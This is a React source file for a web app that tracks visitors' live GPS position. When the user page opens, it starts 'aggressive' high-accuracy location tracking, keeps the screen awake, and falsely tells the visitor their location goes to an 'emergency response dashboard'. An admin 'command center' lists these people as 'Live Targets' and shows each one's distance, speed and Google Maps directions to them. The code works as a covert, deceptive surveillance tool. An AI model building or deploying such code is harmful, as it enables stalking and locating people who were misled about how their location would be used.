import React, { useEffect, useState } from 'react';
import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
import { io } from 'socket.io-client';
import { User, Navigation, ShieldCheck, Map as MapIcon, ExternalLink, LocateFixed } from 'lucide-react';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Fix Leaflet Icons for standard React build
import markerIcon from 'leaflet/dist/images/marker-icon.png';
import markerShadow from 'leaflet/dist/images/marker-shadow.png';
const DefaultIcon = L.icon({ 
  iconUrl: markerIcon, 
  shadowUrl: markerShadow, 
  iconSize: [25, 41], 
  iconAnchor: [12, 41] 
});
L.Marker.prototype.options.icon = DefaultIcon;

// Connect to backend
const socket = io(window.location.hostname === 'localhost' ? 'http://localhost:3000' : '/');

// Helper to calculate distance in KM (Haversine formula)
const getDistance = (lat1, lon1, lat2, lon2) => {
  if (!lat1 || !lon1 || !lat2 || !lon2) return '...';
  const R = 6371; // Radius of earth in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return (R * c).toFixed(2);
};

// Component to auto-center map when Admin clicks a user
function RecenterMap({ coords }) {
  const map = useMap();
  useEffect(() => { 
    if (coords) map.flyTo([coords.lat, coords.lng], 16, { animate: true, duration: 1.5 }); 
  }, [coords, map]);
  return null;
}

export default function App() {
  const [role, setRole] = useState('user');
  const [adminLocation, setAdminLocation] = useState(null);
  const [users, setUsers] = useState([]);
  const [selectedUser, setSelectedUser] = useState(null);

  // Core Setup & Tracking Logic
  useEffect(() => {
    // 1. Get identifiers
    const params = new URLSearchParams(window.location.search);
    const urlName = params.get('name') || `User_${Math.random().toString(36).substr(2, 5)}`;
    
    // Persistent ID so refreshing doesn't break tracking
    const userId = localStorage.getItem('userId') || 'uid_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('userId', userId);

    // 2. Check Role
    if (window.location.pathname.includes('/admin')) {
      setRole('admin');
      // Admin tracks their own location just once to calculate distance to targets
      navigator.geolocation.getCurrentPosition((pos) => {
        setAdminLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
      });
    } else {
      // 3. USER SIDE: Start aggressive tracking automatically
      const startAutoTracking = async () => {
        // Try to keep the screen/GPS from sleeping (Works on supported mobile browsers)
        if ('wakeLock' in navigator) {
          try {
            await navigator.wakeLock.request('screen');
          } catch (err) {
            console.log("Wake Lock not supported/allowed");
          }
        }

        const options = {
          enableHighAccuracy: true, // Forces precise GPS
          maximumAge: 0,            // Prevents using old cached location
          timeout: 10000            // Refresh window
        };

        navigator.geolocation.watchPosition((pos) => {
          const { latitude, longitude, speed } = pos.coords;
          socket.emit('update-location', { 
            userId, 
            name: urlName, 
            lat: latitude, 
            lng: longitude,
            speed: speed 
          });
        }, (err) => console.error("GPS Error:", err), options);
      };
      
      startAutoTracking();
    }

    // 4. Listen for backend updates
    socket.on('users-list', (data) => setUsers(data));
    return () => socket.off('users-list');
  }, []);

  const openInGoogleMaps = (lat, lng) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  // ==========================================
  //               ADMIN VIEW
  // ==========================================
  if (role === 'admin') {
    return (
      <div className="flex h-screen w-full bg-slate-950 text-white font-sans overflow-hidden">
        
        {/* Sidebar */}
        <div className="w-80 bg-slate-900 border-r border-slate-800 p-4 flex flex-col z-[1000] shadow-2xl">
          <div className="flex items-center gap-2 mb-8 p-3 bg-red-500/10 rounded-lg border border-red-500/20">
            <ShieldCheck className="text-red-500 flex-shrink-0" />
            <h1 className="text-sm font-bold tracking-tight">COMMAND CENTER</h1>
          </div>
          
          <div className="flex-1 overflow-y-auto">
            <p className="text-[10px] uppercase text-slate-500 font-black mb-4 tracking-widest">
              Live Targets ({users.length})
            </p>
            
            {users.map(u => {
              const distance = adminLocation ? getDistance(adminLocation.lat, adminLocation.lng, u.lat, u.lng) : '...';
              const speedKmH = u.speed ? (u.speed * 3.6).toFixed(1) : 0;
              
              return (
                <div 
                  key={u.userId} 
                  onClick={() => setSelectedUser(u)}
                  className={`p-4 rounded-xl mb-3 cursor-pointer transition-all border ${selectedUser?.userId === u.userId ? 'bg-blue-600 border-blue-400 shadow-lg scale-[1.02]' : 'bg-slate-800 border-slate-700 hover:bg-slate-700'}`}
                >
                  <div className="flex justify-between items-start mb-2">
                    <span className="font-bold text-sm truncate">{u.name}</span>
                    <span className="text-[10px] bg-black/30 px-2 py-1 rounded text-blue-300 font-mono flex-shrink-0">
                      {distance} km
                    </span>
                  </div>
                  
                  <div className="text-xs text-slate-400 mb-3 flex justify-between">
                    <span>Speed: {speedKmH} km/h</span>
                    <span className="opacity-50 text-[10px]">ID: {u.userId.slice(-4)}</span>
                  </div>

                  <button 
                    onClick={(e) => { e.stopPropagation(); openInGoogleMaps(u.lat, u.lng); }}
                    className="w-full bg-white/10 hover:bg-white/20 p-2 rounded text-[11px] flex items-center justify-center gap-2 transition"
                  >
                    <MapIcon size={14}/> Open in Google Maps
                  </button>
                </div>
              );
            })}
            
            {users.length === 0 && (
              <div className="text-center p-6 text-slate-500 text-sm border border-dashed border-slate-700 rounded-lg">
                No active signals detected.
              </div>
            )}
          </div>
        </div>

        {/* Map Area */}
        <div className="flex-1 relative bg-slate-800">
          <MapContainer center={[20.5937, 78.9629]} zoom={5} className="h-full w-full">
            {/* Highly detailed OpenStreetMap Tiles */}
            <TileLayer 
              url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
              attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
            />
            
            {users.map(u => (
              <Marker 
                key={u.userId} 
                position={[u.lat, u.lng]}
                eventHandlers={{
                  add: (e) => {
                    // Adds CSS transition for smooth marker movement
                    e.target.getElement().style.transition = "transform 1s linear";
                  }
                }}
              >
                <Popup className="text-slate-900 min-w-[150px]">
                  <h3 className="font-bold border-b pb-1 mb-2">{u.name}</h3>
                  <div className="text-xs space-y-1 mb-3 font-mono bg-slate-100 p-2 rounded">
                    <p>LAT: {u.lat.toFixed(5)}</p>
                    <p>LNG: {u.lng.toFixed(5)}</p>
                    <p>SPD: {u.speed ? (u.speed * 3.6).toFixed(1) : 0} km/h</p>
                  </div>
                  <button 
                    onClick={() => openInGoogleMaps(u.lat, u.lng)}
                    className="w-full bg-blue-600 text-white p-2 rounded text-xs flex items-center justify-center gap-1 hover:bg-blue-700 transition"
                  >
                    <ExternalLink size={12}/> Directions
                  </button>
                </Popup>
              </Marker>
            ))}
            {selectedUser && <RecenterMap coords={selectedUser} />}
          </MapContainer>
        </div>
      </div>
    );
  }

  // ==========================================
  //         USER VIEW (ZERO UI)
  // ==========================================
  return (
    <div className="h-screen w-full bg-slate-950 flex flex-col items-center justify-center p-10 text-center relative overflow-hidden">
        {/* Background Animation */}
        <div className="absolute inset-0 flex items-center justify-center">
           <div className="w-64 h-64 bg-blue-600 rounded-full blur-[100px] opacity-20 animate-pulse"></div>
        </div>

        <div className="relative z-10">
            <div className="bg-slate-900 p-4 rounded-full inline-block mb-6 border border-slate-800 shadow-2xl">
                <LocateFixed className="w-12 h-12 text-blue-500 animate-pulse" />
            </div>
            
            <h2 className="text-2xl font-bold text-white mb-3">Secure Connection Active</h2>
            <p className="text-slate-400 text-sm max-w-xs mx-auto leading-relaxed">
              Your location is being securely transmitted to the emergency response dashboard. Keep this page open.
            </p>
            
            <div className="mt-12 inline-flex items-center gap-3 px-4 py-2 bg-blue-500/10 border border-blue-500/20 rounded-full text-[11px] text-blue-400 font-mono tracking-widest">
                <span className="relative flex h-2 w-2">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-blue-500"></span>
                </span>
                TRANSMITTING LIVE
            </div>
        </div>
    </div>
  );
}
